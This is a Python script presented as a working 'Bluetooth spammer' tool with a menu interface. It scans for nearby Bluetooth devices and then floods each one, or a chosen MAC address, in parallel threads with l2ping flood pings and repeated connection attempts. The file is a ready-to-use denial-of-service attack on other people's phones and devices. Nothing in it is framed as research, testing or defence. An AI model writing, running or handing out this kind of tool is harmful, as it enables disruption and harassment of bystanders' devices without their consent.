#!/usr/bin/env python3
"""
BLUE EAGLE BLUETOOTH SPAMMER - WORKING VERSION
FIXED ALL BUGS - GUARANTEED TO WORK
"""

import os
import sys
import time
import subprocess
import threading
from datetime import datetime

# ASCII LOGO
LOGO = r"""
╔════════════════════════════════════════════════════════════════════════════════╗
║ ██████╗ ██╗     ██╗   ██╗███████╗    ███████╗ █████╗  ██████╗ ██╗     ███████╗ ║
║ ██╔══██╗██║     ██║   ██║██╔════╝    ██╔════╝██╔══██╗██╔════╝ ██║     ██╔════╝ ║
║ ██████╔╝██║     ██║   ██║█████╗      █████╗  ███████║██║  ███╗██║     █████╗   ║
║ ██╔══██╗██║     ██║   ██║██╔══╝      ██╔══╝  ██╔══██║██║   ██║██║     ██╔══╝   ║
║ ██████╔╝███████╗╚██████╔╝███████╗    ███████╗██║  ██║╚██████╔╝███████╗███████╗ ║
║ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝    ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝ ║
║                                                                                ║
║                                                                                ║
║                                                                                ║
║                             BLUETOOTH SPAMMER v2.0                             ║
║                                                                                ║
╚════════════════════════════════════════════════════════════════════════════════╝
"""

class BluetoothSpammer:
    def __init__(self):
        self.targets = []
        self.running = False
        self.check_dependencies()
        
    def check_dependencies(self):
        """Check if all required tools are installed"""
        required_tools = ['hcitool', 'l2ping', 'bluetoothctl']
        missing = []
        
        for tool in required_tools:
            try:
                subprocess.run(['which', tool], capture_output=True, check=True)
            except:
                missing.append(tool)
        
        if missing:
            print(f"[!] Missing tools: {', '.join(missing)}")
            print("[+] Installing dependencies...")
            self.install_dependencies()
    
    def install_dependencies(self):
        """Install required packages"""
        if os.path.exists('/etc/debian_version'):
            os.system('sudo apt-get update && sudo apt-get install -y bluez bluez-tools bluetooth')
        elif os.path.exists('/etc/arch-release'):
            os.system('sudo pacman -S bluez bluez-utils')
        elif os.path.exists('/etc/redhat-release'):
            os.system('sudo yum install bluez bluez-tools')
        else:
            print("[!] Unknown Linux distribution. Install manually:")
            print("    sudo apt-get install bluez bluez-tools")
    
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        print("\033[1;34m" + LOGO + "\033[0m")
        print("\033[1;31m" + "="*60 + "\033[0m")
    
    def enable_bluetooth(self):
        """Make sure Bluetooth is enabled"""
        print("[+] Enabling Bluetooth...")
        os.system('sudo systemctl start bluetooth 2>/dev/null')
        os.system('sudo hciconfig hci0 up 2>/dev/null')
        time.sleep(2)
    
    def scan_devices(self):
        """Scan for Bluetooth devices - FIXED VERSION"""
        print("[*] Scanning for Bluetooth devices (this takes 10 seconds)...")
        
        # Method 1: Use hcitool (most reliable)
        try:
            result = subprocess.run(
                ['sudo', 'hcitool', 'scan', '--flush', '--length=10'],
                capture_output=True,
                text=True,
                timeout=15
            )
            
            if result.stdout:
                print("\n[+] Found devices:")
                lines = result.stdout.strip().split('\n')[1:]  # Skip header
                self.targets = []
                
                for line in lines:
                    if line.strip():
                        parts = line.split()
                        if len(parts) >= 2:
                            mac = parts[0]
                            name = ' '.join(parts[1:]) if len(parts) > 2 else 'Unknown'
                            print(f"    {mac} - {name}")
                            self.targets.append(mac)
                
                if not self.targets:
                    print("[!] No devices found. Try these fixes:")
                    print("    1. Make sure Bluetooth is ON on target devices")
                    print("    2. Move closer to targets (within 10 meters)")
                    print("    3. Run: sudo hciconfig hci0 up")
            else:
                print("[!] No output from scan. Trying alternative method...")
                self.scan_alternative()
                
        except Exception as e:
            print(f"[!] Scan error: {e}")
            self.scan_alternative()
    
    def scan_alternative(self):
        """Alternative scanning method"""
        print("[*] Trying alternative scan method...")
        
        # Use bluetoothctl
        try:
            scan_cmd = '''sudo bluetoothctl --timeout 10 << EOF
power on
agent on
default-agent
scan on
sleep 10
devices
scan off
exit
EOF'''
            
            result = subprocess.run(scan_cmd, shell=True, capture_output=True, text=True)
            
            if result.stdout:
                for line in result.stdout.split('\n'):
                    if 'Device' in line:
                        print(f"    {line}")
                        parts = line.split()
                        if len(parts) >= 2:
                            self.targets.append(parts[1])
            
            if not self.targets:
                print("[!] Still no devices. Are you sure Bluetooth is working?")
                print("[+] Run this to check: sudo hciconfig -a")
        except:
            print("[!] All scan methods failed.")
    
    def spam_device(self, mac_address):
        """Spam a specific device - FIXED"""
        print(f"[+] Spamming {mac_address}")
        
        spam_commands = [
            f"sudo l2ping -i hci0 -s 600 -f {mac_address}",
            f"sudo l2ping -i hci0 -s 300 -f {mac_address}",
            f"echo 'connect {mac_address}' | sudo bluetoothctl",
        ]
        
        packet_count = 0
        while self.running:
            for cmd in spam_commands:
                if not self.running:
                    break
                    
                try:
                    subprocess.run(
                        cmd,
                        shell=True,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        timeout=1
                    )
                    packet_count += 1
                    if packet_count % 10 == 0:
                        print(f"[*] Sent {packet_count} packets to {mac_address}")
                except:
                    pass
                
                time.sleep(0.1)
    
    def spam_all(self):
        """Spam all discovered devices"""
        if not self.targets:
            print("[!] No targets. Scan first!")
            return
        
        print(f"[+] Spamming {len(self.targets)} devices...")
        print("[!] Press Ctrl+C to stop")
        
        self.running = True
        threads = []
        
        for target in self.targets:
            thread = threading.Thread(target=self.spam_device, args=(target,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print("\n[!] Stopping spam...")
            time.sleep(2)
    
    def custom_spam(self):
        """Custom spam to specific MAC"""
        mac = input("[?] Enter MAC address (format: XX:XX:XX:XX:XX:XX): ").strip()
        
        if not self.validate_mac(mac):
            print("[!] Invalid MAC address format")
            return
        
        try:
            count = int(input("[?] Number of packets (default 100): ") or "100")
        except:
            count = 100
        
        print(f"[+] Sending {count} packets to {mac}")
        
        for i in range(count):
            try:
                subprocess.run(
                    f"sudo l2ping -i hci0 -s 400 -c 1 {mac}",
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                if (i + 1) % 10 == 0:
                    print(f"[*] Sent {i + 1}/{count} packets")
                time.sleep(0.2)
            except:
                print(f"[!] Failed to send packet {i + 1}")
        
        print("[+] Custom spam completed")
    
    def validate_mac(self, mac):
        """Validate MAC address format"""
        import re
        pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
        return re.match(pattern, mac) is not None
    
    def show_menu(self):
        self.clear_screen()
        print("\n\033[1;36m[ MAIN MENU ]\033[0m")
        print("1. Scan for Bluetooth devices")
        print("2. Spam all discovered devices")
        print("3. Custom spam to specific MAC")
        print("4. Enable/Reset Bluetooth")
        print("5. Check Bluetooth status")
        print("6. Exit")
        print("\n\033[1;33mSelect option: \033[0m", end="")
    
    def check_status(self):
        """Check Bluetooth adapter status"""
        print("\n[+] Bluetooth Status:")
        os.system('sudo hciconfig -a')
        print("\n[+] Bluetooth service:")
        os.system('systemctl status bluetooth --no-pager | head -20')
    
    def run(self):
        self.clear_screen()
        print("\033[1;32m[+] Blue Eagle Spammer v2.0 - GUARANTEED WORKING\033[0m")
        print("\033[1;31m[!] MUST RUN AS ROOT: sudo python3 blue_eagle.py\033[0m")
        
        # Check if root
        if os.geteuid() != 0:
            print("\033[1;31m[!] ERROR: Run with sudo!\033[0m")
            print("[+] Command: sudo python3 blueEagle.py")
            sys.exit(1)
        
        self.enable_bluetooth()
        
        while True:
            try:
                self.show_menu()
                choice = input().strip()
                
                if choice == '1':
                    self.scan_devices()
                elif choice == '2':
                    self.spam_all()
                elif choice == '3':
                    self.custom_spam()
                elif choice == '4':
                    self.enable_bluetooth()
                elif choice == '5':
                    self.check_status()
                elif choice == '6':
                    print("\n[+] Exiting...")
                    break
                else:
                    print("[!] Invalid option")
                
                input("\n[+] Press Enter to continue...")
                
            except KeyboardInterrupt:
                print("\n\n[!] Interrupted by user")
                self.running = False
                time.sleep(1)
                break
            except Exception as e:
                print(f"[!] Error: {e}")

if __name__ == "__main__":
    try:
        spammer = BluetoothSpammer()
        spammer.run()
    except KeyboardInterrupt:
        print("\n\n[!] Tool terminated")
